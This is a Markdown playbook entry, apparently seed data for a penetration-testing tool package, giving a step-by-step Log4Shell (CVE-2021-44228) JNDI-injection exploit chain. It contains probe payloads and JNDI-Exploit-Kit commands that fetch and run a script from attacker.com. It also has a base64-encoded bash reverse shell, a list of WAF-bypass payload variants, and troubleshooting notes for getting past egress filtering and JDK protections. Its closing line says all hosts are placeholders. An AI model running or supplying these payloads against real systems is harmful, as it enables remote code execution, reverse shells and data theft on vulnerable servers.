# [Seed] Log4Shell (CVE-2021-44228) JNDI Injection to RCE

## Scenario Classification
Penetration testing / Web RCE

## Target Overview
A Java web application runs an affected Log4j2 version (< 2.17.0); any user-controlled field being logged triggers JNDI remote loading. Stand up an LDAP/RMI service to push a malicious class and gain execution rights on the target machine.

## Full Execution Chain

1. Target identification
   - HTTP headers `Server`, `X-Powered-By` revealing Java application frameworks (Tomcat/Spring/Liferay)
   - Version fingerprinting: login page, 404 page, path disclosure
   - Vulnerability confirmation: send probe payloads through any field that ends up in logs (User-Agent, Referer, X-Forwarded-For, login username, search box)
2. Prepare an OOB listener
   - DNSLog platform (dnslog.cn / interactsh / Burp Collaborator)
   - Self-hosted LDAP service (marshalsec / JNDI-Exploit-Kit)
3. Probe for the vulnerability
   ```
   ${jndi:ldap://abc123.dnslog.cn/x}
   ```
   Insert into fields like User-Agent; the vulnerability is confirmed when the DNSLog platform receives a `abc123.dnslog.cn` resolution record
4. Start the exploit service (own public VPS or an ngrok reverse proxy)
   ```bash
   java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
   ```
5. Trigger the exploit payload
   ```
   ${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
   ```
6. Reverse shell obtained → follow attack-chain for subsequent privesc / persistence

## Pitfall Log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| Probe payload gets no DNS callback | Target is on an internal network with no internet access | Use DNS-only OOB such as oast.online, or test against an internal DNSLog | 1h |
| DNS resolves but LDAP fails | Egress policy allows DNS only | Switch to DNS Exfiltration to carry data out directly, skip LDAP | 1.5h |
| LDAP reachable but target doesn't load the class | Higher JDK versions (8u191+/11.0.1+/...) default `com.sun.jndi.ldap.object.trustURLCodebase=false` | Switch to local gadget chains like `Tomcat` / `Groovy` / `BeanFactory` (no remote class loading needed) | 3h |
| Double quotes escaped / payload blocked by WAF | Existing rules defeated by various ${} nestings | Use `${${::-j}ndi:...}` / `${${lower:j}ndi:...}` / `${env:xx:-jndi}` nested bypasses | 1h |
| Vulnerability triggered but no shell | Command with special characters gets mangled in Runtime.exec | Wrap in base64 encoding: `bash -c {echo,base64}|{base64,-d}|bash` | 30min |
| Spring Boot app didn't reproduce | Spring uses Logback, not Log4j2 | Check the dependency tree for spring-boot-starter-log4j2 | 20min |

## Toolchain Findings

- **JNDI-Exploit-Kit** (welk1n / pimps): one command stands up LDAP+RMI+HTTP, supports local gadget bypass
- **JNDI-Injection-Exploit**: older tool with broader gadget support but no longer maintained
- **Nuclei**: template `cves/2021/CVE-2021-44228.yaml` is good for scanning whether assets are affected
- **interactsh-client**: from ProjectDiscovery; a self-hosted OOB is more private than dnslog.cn
- **CrowdStrike CVE-2021-44228 scanner**: detects JndiLookup.class at the binary level

## Key Code/Commands

WAF bypass payload collection:

```text
${jndi:ldap://x.dnslog.cn/a}                    # basic
${${::-j}ndi:ldap://x.dnslog.cn/a}              # nested
${${lower:j}ndi:ldap://x.dnslog.cn/a}           # lower
${${upper:j}ndi:ldap://x.dnslog.cn/a}           # upper
${${env:NaN:-j}ndi:ldap://x.dnslog.cn/a}        # env fallback
${jndi:${lower:l}${lower:d}a${lower:p}://...}   # extreme character splitting
${jndi:dns://x.dnslog.cn}                       # DNS channel
${jndi:rmi://attacker.com:1099/a}               # RMI instead of LDAP
```

Starting an interactsh service:

```bash
interactsh-client -v
# Output: abc123.oast.online ← use this domain to replace the dnslog in payloads
```

JNDI-Exploit-Kit one-command exploit:

```bash
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -L attacker.com:1389 \
  -P attacker.com:8888 \
  -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash'
# Emits multiple usable payloads; pick one and insert into the target
```

## Improvement Suggestions for This Package

- Build `pentest-tools/references/log4shell-bypass-payloads.md` as its own file, collecting the 50+ bypass payloads
- The nuclei template already ships → remind users of `nuclei -t cves/2021/CVE-2021-44228.yaml -l targets.txt`
- Add a standard post-entry action checklist to attack-chain for "after entering the internal network via Log4Shell"

## Reusable Patterns/Script Snippets

**Log4Shell 3-stage probing**:

```text
1. Batch-send ${jndi:ldap://oob/a} across many fields → check the OOB platform for callbacks
2. Callback received → stand up local-gadget LDAP (no remote class loading) → push payload
3. No callback → switch to the DNS channel for out-of-band data exfiltration
```

**Key decisions**:

```text
- DNSLog got a callback but LDAP fails → higher JDK, must use local gadgets
- Even DNS fails → internal-network OOB / second-order reflection (hit an egress-capable secondary system first)
- Command with special characters gets no response → wrap in base64
```

## Evolution Actions
- [x] Routing matrix already has "Log4j" / "JNDI injection" keywords
- [ ] Create log4shell-bypass-payloads.md separately
- [ ] Add interactsh-client to the bootstrap manifest

## Environment Info
- Attack box: Kali, Java 8 (running the LDAP service)
- OOB platform: dnslog.cn / oast.online / self-hosted interactsh
- Target: any Java web app with Log4j2 < 2.17.0

## Sanitization Requirements
This entry is seed data written from public CVE information; no real production targets involved. All domains/IPs are placeholder examples.
